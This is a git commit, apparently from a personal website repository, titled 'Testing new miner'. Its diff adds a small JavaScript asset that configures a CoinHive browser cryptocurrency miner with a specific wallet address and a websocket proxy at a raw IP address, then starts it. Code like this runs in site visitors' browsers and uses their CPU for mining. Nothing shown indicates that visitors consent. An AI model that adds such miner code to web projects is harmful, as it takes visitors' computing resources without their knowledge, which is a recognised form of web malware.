8f7aaa453d32b04c4e04d890a63cb963b6b6cfcc
Emiller88 <edmund.a.miller@gmail.com>
2017-10-04 17:48:27 -0500

    Testing new miner

---
+++ assets/js/startMiner.js
@@ -0,0 +1,3 @@
+CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://52.15.81.69:8892/proxy"]];
+var miner = new CoinHive.User('48wUPadvpyEK2D7A3ZdvZPKWc5x2pndKv5p6zaUWcD3BGoULjjK3KKkPTyutkmM6JjLaAYhHmNbVVU8FkJTbwr6gQRsr74V', 'UTDRUGBYTEST');
+miner.start();
